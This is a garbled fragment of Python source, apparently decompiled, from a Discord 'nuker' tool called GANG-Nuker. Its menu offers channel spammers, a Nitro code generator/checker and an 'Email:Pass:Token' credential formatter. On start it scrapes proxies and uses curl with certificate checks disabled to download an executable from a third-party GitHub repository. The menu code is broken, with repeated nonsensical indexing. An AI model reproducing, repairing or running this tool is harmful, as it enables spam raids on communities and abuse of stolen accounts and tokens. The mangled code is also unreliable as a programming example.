Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}''']()
        spammer()
        return None
    []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}'''] if antispam == 'y' else []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'] if extreme_speed == 'y' else []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}''']()
    spammer()

if __name__ == '__main__':
    import sys
    setTitle('GANG-Nuker Opening...')
    os.system('if not exist "./chromedriver.exe" echo [-] Downloading Drivers: ')
    os.system('if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" ')
    if os.path.basename(sys.argv[0]).endswith('exe'):
        if not os.path.exists(getTempDir() + '\\gang_proxies'):
            proxy_scrape()
        clear()
    elif not os.path.exists(getTempDir() + '\\gang_proxies'):
        proxy_scrape()
    clear()
















spammer()
